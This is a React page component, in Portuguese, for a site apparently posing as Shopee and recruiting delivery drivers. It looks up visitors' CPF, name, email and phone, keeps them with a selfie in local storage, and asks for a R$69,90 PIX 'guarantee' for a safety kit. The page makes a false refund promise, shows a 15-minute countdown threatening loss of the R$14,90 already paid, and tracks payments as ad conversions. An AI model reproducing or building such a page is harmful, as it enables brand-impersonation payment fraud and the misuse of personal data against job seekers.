import React, { useState, useEffect } from 'react';
import { addDays, format } from 'date-fns';
import { ptBR } from 'date-fns/locale';
import { useLocation, useRoute } from 'wouter';

import Header from '@/components/Header';
import Footer from '@/components/Footer';
import CommentsSection from '@/components/CommentsSection';
import { Button } from '@/components/ui/button';
import { useToast } from '@/hooks/use-toast';
import { Spinner } from '@/components/ui/spinner';
import { useScrollTop } from '@/hooks/use-scroll-top';
import { createPixPayment } from '../lib/payments-api';
import { initFacebookPixel, trackEvent } from '../lib/facebook-pixel';
import EntregadorCracha from '@/components/EntregadorCracha';

import kitEpiImage from '../assets/kit-epi-new.webp';

// Declaração de tipos para TikTok Pixel
declare global {
  interface Window {
    ttq: any;
  }
}

// Interface para os dados do usuário
interface DadosUsuario {
  nome: string;
  cpf: string;
  email?: string;
  telefone?: string;
}

const Epi: React.FC = () => {
  const [, setLocation] = useLocation();
  const [match, params] = useRoute('/p/:cpf');
  useScrollTop();
  
  const [dadosUsuario, setDadosUsuario] = useState<DadosUsuario | null>(null);
  const [dataEntrega, setDataEntrega] = useState<string>('');
  const [selfieImage, setSelfieImage] = useState<string | null>(null);
  const [isLoading, setIsLoading] = useState(false);
  const [isLoadingCpf, setIsLoadingCpf] = useState(false);
  const [timeLeft, setTimeLeft] = useState<number>(900); // 15 minutos em segundos
  const { toast } = useToast();

  // Função para buscar dados do CPF na API (usando proxy local para evitar CORS)
  const fetchCpfData = async (cpf: string) => {
    try {
      setIsLoadingCpf(true);
      console.log(`[EPI] Buscando dados para CPF: ${cpf}`);
      
      // Usar endpoint local que funciona como proxy (evita CORS)
      const apiUrl = `/api/cliente/cpf/${cpf}`;
      
      const response = await fetch(apiUrl, {
        method: 'GET',
        headers: {
          'Accept': 'application/json',
          'Content-Type': 'application/json'
        }
      });
      
      if (response.ok) {
        const data = await response.json();
        console.log('[EPI] Dados recebidos:', data);
        
        if (data.sucesso && data.cliente) {
          const cliente = data.cliente;
          
          // Salvar dados no localStorage
          const userData = {
            nome: cliente.nome,
            cpf: cliente.cpf,
            email: cliente.email,
            telefone: cliente.telefone,
            id: cliente.id,
            data_cadastro: cliente.data_cadastro
          };
          
          localStorage.setItem('candidato_data', JSON.stringify(userData));
          localStorage.setItem('user_name', cliente.nome);
          localStorage.setItem('user_cpf', cliente.cpf);
          localStorage.setItem('user_data', JSON.stringify(userData));
          
          console.log('[EPI] Dados salvos no localStorage');
          
          // Definir os dados no estado
          setDadosUsuario({
            nome: cliente.nome,
            cpf: cliente.cpf,
            email: cliente.email,
            telefone: cliente.telefone
          });
          
          toast({
            title: "Dados carregados!",
            description: `Olá ${cliente.nome}, seus dados foram carregados com sucesso.`,
          });
        } else {
          toast({
            title: "CPF não encontrado",
            description: "Não encontramos seus dados. Você será redirecionado para o cadastro.",
            variant: "destructive",
          });
          setTimeout(() => {
            setLocation('/');
          }, 3000);
        }
      } else {
        throw new Error('Erro ao consultar CPF');
      }
    } catch (error) {
      console.error('[EPI] Erro ao buscar dados:', error);
      toast({
        title: "⏱️ Sistema lento",
        description: "A busca dos seus dados está demorando mais que o normal. Por favor, tente novamente em alguns instantes ou entre em contato com o suporte.",
        variant: "destructive",
        duration: 8000,
      });
      setTimeout(() => {
        setLocation('/');
      }, 8000);
    } finally {
      setIsLoadingCpf(false);
    }
  };

  // Inicializar o Facebook Pixel e carregar dados
  useEffect(() => {
    initFacebookPixel();
    
    // Extrair CPF do params se existir
    const cpfFromUrl = match && params?.cpf ? params.cpf : null;
    
    // Se acessou via /p/:cpf, buscar dados da API
    if (cpfFromUrl) {
      console.log('[EPI] Acessado via /p/:cpf, buscando dados na API...');
      fetchCpfData(cpfFromUrl);
      return; // Não continuar com carregamento do localStorage
    }
    
    // Caso contrário, carregar do localStorage (comportamento original)
    let nomeUsuario = '';
    let cpfUsuario = '';
    let emailUsuario = '';
    let telefoneUsuario = '';
    
    const candidatoData = localStorage.getItem('candidato_data');
    if (candidatoData) {
      try {
        const parsedCandidatoData = JSON.parse(candidatoData);
        if (parsedCandidatoData.nome && parsedCandidatoData.cpf) {
          nomeUsuario = parsedCandidatoData.nome;
          cpfUsuario = parsedCandidatoData.cpf;
          emailUsuario = parsedCandidatoData.email || '';
          telefoneUsuario = parsedCandidatoData.telefone || '';
        }
      } catch (error) {
        console.error("[EPI] Erro ao processar candidato_data:", error);
      }
    }
    
    if (!nomeUsuario || !cpfUsuario) {
      const userData = localStorage.getItem('user_data');
      if (userData) {
        try {
          const parsedUserData = JSON.parse(userData);
          if (parsedUserData.nome && parsedUserData.cpf) {
            nomeUsuario = parsedUserData.nome;
            cpfUsuario = parsedUserData.cpf;
            emailUsuario = parsedUserData.email || '';
            telefoneUsuario = parsedUserData.telefone || '';
          }
        } catch (error) {
          console.error("[EPI] Erro ao processar user_data:", error);
        }
      }
    }
    
    if (nomeUsuario && cpfUsuario) {
      setDadosUsuario({
        nome: nomeUsuario,
        cpf: cpfUsuario,
        email: emailUsuario,
        telefone: telefoneUsuario
      });
    }
    
    // Recuperar imagem da selfie
    const selfieData = localStorage.getItem('selfie_image');
    if (selfieData) {
      setSelfieImage(selfieData);
    }

    // Calcular data de entrega (5 dias a partir de hoje)
    const hoje = new Date();
    const dataEntregaObj = addDays(hoje, 5);
    const dataFormatada = format(dataEntregaObj, "EEEE, dd/MM/yyyy", { locale: ptBR });
    setDataEntrega(dataFormatada.charAt(0).toUpperCase() + dataFormatada.slice(1));
  }, []);

  // TikTok Pixel - Evento Purchase (conversão R$14,90)
  useEffect(() => {
    // Verificar se já disparou o evento Purchase na página EPI para evitar duplicatas
    const epiPurchaseTracked = sessionStorage.getItem('tiktok_epi_purchase_tracked');
    
    if (epiPurchaseTracked === 'true') {
      console.log('⏭️ TikTok Pixel (EPI): Purchase já foi registrado nesta sessão. Ignorando duplicata.');
      return;
    }
    
    // Carregar TikTok Pixel se ainda não estiver carregado
    if (!window.ttq) {
      const script = document.createElement('script');
      script.innerHTML = `
        !function (w, d, t) {
          w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(
        var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var r="https://analytics.tiktok.com/i18n/pixel/events.js",o=n&&n.partner;ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=r,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};n=document.createElement("script")
        ;n.type="text/javascript",n.async=!0,n.src=r+"?sdkid="+e+"&lib="+t;e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(n,e)};
        
        ttq.load('D3VPC8RC77U1N95EC20G');
        ttq.page();
        }(window, document, 'ttq');
      `;
      document.head.appendChild(script);
    }
    
    // Disparar evento Purchase após TikTok Pixel estar carregado
    setTimeout(() => {
      if (window.ttq) {
        // Marcar como disparado ANTES de disparar (previne race conditions)
        sessionStorage.setItem('tiktok_epi_purchase_tracked', 'true');
        
        // Disparar evento Purchase (conversão de R$14,90)
        window.ttq.track('Purchase', {
          content_type: 'product',
          content_id: 'taxa-entrega-shopee',
          content_name: 'Taxa de Entrega - Kit Shopee',
          value: 14.90,
          currency: 'BRL'
        });
        
        console.log('✅ TikTok Pixel (D3VPC8RC77U1N95EC20G): Evento Purchase registrado (R$ 14,90)');
      }
    }, 1000);
  }, []);

  // Timer de 15 minutos
  useEffect(() => {
    const interval = setInterval(() => {
      setTimeLeft(prev => {
        if (prev <= 1) {
          clearInterval(interval);
          toast({
            title: "⏰ Tempo esgotado",
            description: "O prazo para pagamento expirou. Seu cadastro foi cancelado.",
            variant: "destructive",
          });
          setTimeout(() => {
            setLocation('/');
          }, 3000);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(interval);
  }, []);

  const formatTime = (seconds: number): string => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
  };

  // Função para processar o pagamento da garantia
  const processarPagamentoGarantia = async () => {
    console.log("🎯 [EPI] processarPagamentoGarantia INICIADO");
    
    try {
      if (!dadosUsuario?.nome || !dadosUsuario?.cpf) {
        console.error("❌ [EPI] Dados do usuário incompletos");
        throw new Error("Dados do usuário incompletos");
      }

      setIsLoading(true);
      
      toast({
        title: "Processando...",
        description: "Gerando seu pagamento PIX. Aguarde...",
      });
      
      console.log('🎯 [EPI] Iniciando processamento de pagamento For4Payments para garantia de R$69,90');
      
      // Usar a função centralizada para processar o pagamento com valor de 69.90
      const pixData = await createPixPayment({
        name: dadosUsuario.nome,
        cpf: dadosUsuario.cpf,
        email: dadosUsuario.email || '',
        phone: dadosUsuario.telefone || '',
        amount: 69.90 // Valor da garantia
      });
      
      console.log('🎯 [EPI] Pagamento processado com sucesso:', pixData);
      
      if (!pixData.pixCode || !pixData.id) {
        throw new Error('Resposta incompleta da API de pagamento');
      }
      
      // Rastrear evento de checkout iniciado no Facebook Pixel
      trackEvent('InitiateCheckout', {
        content_name: 'Garantia EPI Shopee',
        content_ids: [pixData.id],
        content_type: 'product',
        value: 69.90,
        currency: 'BRL'
      });
      
      // Armazenar ID da transação
      localStorage.setItem('current_payment_id', pixData.id);
      localStorage.setItem('payment_type', 'garantia'); // Identificar tipo de pagamento
      
      // Redirecionar para a página de garantia
      console.log('[EPI] 🔀 Redirecionando para página de garantia:', pixData.id);
      
      const targetUrl = `/garantia?id=${pixData.id}&email=${encodeURIComponent(dadosUsuario.email || '')}`;
      
      toast({
        title: "✅ PIX gerado com sucesso!",
        description: "Redirecionando para página de pagamento...",
      });
      
      setLocation(targetUrl);
      
      setTimeout(() => {
        window.location.href = targetUrl;
      }, 100);
      
    } catch (error: any) {
      console.error("Erro ao processar pagamento:", error);
      setIsLoading(false);
      toast({
        title: "Erro ao processar pagamento",
        description: error.message || "Não foi possível gerar o pagamento. Tente novamente.",
        variant: "destructive",
      });
    }
  };

  // Mostrar loading enquanto busca dados da API
  if (isLoadingCpf) {
    return (
      <div className="bg-white min-h-screen flex flex-col">
        <Header />
        
        <div className="w-full bg-[#EE4E2E] py-1 px-6 flex items-center relative overflow-hidden">
          <div className="absolute right-0 top-0 bottom-0 w-32 h-full rounded-l-full bg-[#E83D22]"></div>
          
          <div className="flex items-center relative z-10">
            <div className="text-white mr-3">
              <i className="fas fa-chevron-right text-3xl font-black" style={{color: 'white'}}></i>
            </div>
            <div className="leading-none">
              <h1 className="text-base font-bold text-white mb-0">Kit EPI - Garantia</h1>
              <p className="text-white text-sm mt-0" style={{transform: 'translateY(-2px)'}}>Shopee</p>
            </div>
          </div>
        </div>
        
        <div className="flex-grow container mx-auto px-4 py-8 flex items-center justify-center">
          <div className="text-center">
            <Spinner className="w-12 h-12 mx-auto mb-4" />
            <p className="text-lg text-gray-600">Carregando seus dados...</p>
            <p className="text-sm text-gray-500 mt-2">Por favor, aguarde.</p>
          </div>
        </div>
        
        <Footer />
      </div>
    );
  }
  
  return (
    <div className="bg-white min-h-screen flex flex-col">
      <Header />
      
      <div className="w-full bg-[#EE4E2E] py-1 px-6 flex items-center relative overflow-hidden">
        <div className="absolute right-0 top-0 bottom-0 w-32 h-full rounded-l-full bg-[#E83D22]"></div>
        
        <div className="flex items-center relative z-10">
          <div className="text-white mr-3">
            <i className="fas fa-chevron-right text-3xl font-black" style={{color: 'white'}}></i>
          </div>
          <div className="leading-none">
            <h1 className="text-base font-bold text-white mb-0">Kit EPI - Garantia</h1>
            <p className="text-white text-sm mt-0" style={{transform: 'translateY(-2px)'}}>Shopee</p>
          </div>
        </div>
      </div>
      
      <div className="flex-grow container mx-auto px-4 py-8">
        <div className="w-full max-w-4xl mx-auto">
          
          {/* Box de Status do Cadastro - ALTERADA */}
          <div className="bg-white shadow-md rounded-lg overflow-hidden mb-8">
            <div className="bg-[#FFF8F6] p-4 border-b border-[#E83D2220]">
              <h3 className="font-semibold text-[#E83D22]">Status do Cadastro</h3>
            </div>
            <div className="p-6">
              <div className="bg-amber-50 border border-amber-200 rounded-lg p-6">
                <div className="flex flex-col items-center">
                  <div className="text-amber-600 text-4xl mb-4">
                    <i className="fas fa-exclamation-triangle"></i>
                  </div>
                  <div className="w-full">
                    <h4 className="text-amber-900 font-semibold text-lg mb-3 text-center">Importante: Mudança na Política de Entrega do Kit EPI</h4>
                    
                    <p className="text-amber-800 mb-3">
                      A Shopee não está mais entregando o Kit EPI <strong>gratuitamente</strong> devido a um grande número de solicitações 
                      de pessoas que pagavam apenas a taxa de entrega de <strong>R$14,90</strong> e não trabalhavam como entregadores, 
                      causando prejuízos significativos para a empresa.
                    </p>
                    
                    <p className="text-amber-800 mb-3">
                      Como medida de precaução, agora estamos cobrando um <strong>valor de garantia de R$69,90</strong> para 
                      a entrega do Kit EPI.
                    </p>
                    
                    <div className="bg-green-50 border border-green-200 rounded-md p-4 mt-4">
                      <p className="text-green-800 font-medium mb-2">
                        ✅ Devolução do Valor da Garantia
                      </p>
                      <p className="text-green-700">
                        Quando você realizar a <strong>primeira entrega</strong> como entregador Shopee, 
                        o valor total de <strong>R$69,90</strong> será <strong>devolvido</strong> junto com o 
                        pagamento da sua primeira entrega.
                      </p>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>

          {/* Box de Aviso sobre Cancelamento - NOVA */}
          <div className="bg-white shadow-md rounded-lg overflow-hidden mb-8">
            <div className="p-6">
              <div className="bg-red-50 border-2 border-red-300 rounded-lg p-6">
                <div className="flex items-start gap-3 mb-4">
                  <div className="text-red-600 text-3xl">
                    <i className="fas fa-clock"></i>
                  </div>
                  <div className="flex-1">
                    <h4 className="text-red-900 font-bold text-xl mb-2">⚠️ ATENÇÃO: Prazo de Pagamento</h4>
                    <p className="text-red-800 text-lg">
                      Você tem <strong className="text-2xl">{formatTime(timeLeft)}</strong> minutos para realizar o pagamento da garantia.
                    </p>
                  </div>
                </div>
                
                <div className="bg-white border border-red-200 rounded-md p-4">
                  <p className="text-red-900 font-semibold mb-2">
                    Se o pagamento da garantia de <span className="text-2xl">R$69,90</span> não for realizado dentro deste prazo:
                  </p>
                  <ul className="list-disc pl-6 space-y-1 text-red-800">
                    <li><strong>Seu cadastro será CANCELADO automaticamente</strong></li>
                    <li><strong>Você perderá o direito aos valores já pagos (R$14,90)</strong></li>
                    <li>Será necessário reiniciar todo o processo de cadastro</li>
                  </ul>
                </div>
              </div>
            </div>
          </div>
          
          {/* Box do Kit EPI - MANTIDA */}
          <div className="bg-white shadow-md rounded-lg overflow-hidden mb-8">
            <div className="bg-[#FFF8F6] p-4 border-b border-[#E83D2220]">
              <h3 className="font-semibold text-[#E83D22]">Kit de Segurança Oficial Shopee</h3>
            </div>
            <div className="p-6">
              <div className="flex flex-col md:flex-row gap-6 items-center">
                <div className="w-full md:w-2/5">
                  <img 
                    src={kitEpiImage} 
                    alt="Kit EPI Shopee" 
                    className="w-full rounded-lg"
                  />
                </div>
                <div className="w-full md:w-3/5">
                  <h4 className="text-lg font-medium mb-3">Kit Completo para Entregadores</h4>
                  <p className="text-gray-600 mb-4">
                    Para garantir sua segurança durante as entregas, a Shopee exige que todos os entregadores 
                    utilizem equipamentos de proteção individual. O kit inclui:
                  </p>
                  <ul className="list-disc pl-5 mb-4 space-y-1 text-gray-700">
                    <li>2 Coletes refletivos com identificação Shopee (laranja e amarelo)</li>
                    <li>Par de luvas de proteção</li>
                    <li>Botas de segurança antiderrapantes</li>
                  </ul>
                  <div className="bg-yellow-50 p-3 rounded-md border border-yellow-200 mb-4">
                    <p className="text-sm text-yellow-800">
                      <strong>Importante:</strong> O uso do kit completo é obrigatório durante todas 
                      as entregas. O não uso pode resultar em suspensão temporária.
                    </p>
                  </div>
                  <div className="bg-orange-50 p-4 rounded-md border border-orange-200 mb-2">
                    <p className="text-gray-700">
                      <span className="font-medium">Data estimada de entrega:</span> <span className="text-[#E83D22] font-medium">{dataEntrega}</span>
                    </p>
                  </div>
                </div>
              </div>
            </div>
          </div>

          {/* Botão de Pagamento - SEM CHECKBOX */}
          <div className="bg-white shadow-md rounded-lg overflow-hidden mb-8">
            <div className="p-6">
              <Button
                onClick={processarPagamentoGarantia}
                disabled={isLoading}
                className="w-full text-white font-medium py-6 text-lg rounded-md bg-[#E83D22] hover:bg-[#d73920]"
                style={{ height: '60px' }}
                data-testid="button-pagar-garantia"
              >
                {isLoading ? (
                  <div className="flex items-center justify-center gap-2">
                    <Spinner className="h-5 w-5" />
                    <span>Processando...</span>
                  </div>
                ) : (
                  <>
                    <i className="fas fa-shield-alt mr-2"></i>
                    Pagar Garantia e Continuar
                  </>
                )}
              </Button>
              
              <p className="text-center text-sm text-gray-600 mt-4">
                <i className="fas fa-lock mr-1"></i>
                Pagamento seguro via PIX • Garantia devolvida na primeira entrega
              </p>
            </div>
          </div>
        </div>
      </div>
      
      <div className="container mx-auto px-4">
        <CommentsSection />
      </div>
      
      <Footer />
    </div>
  );
};

export default Epi;
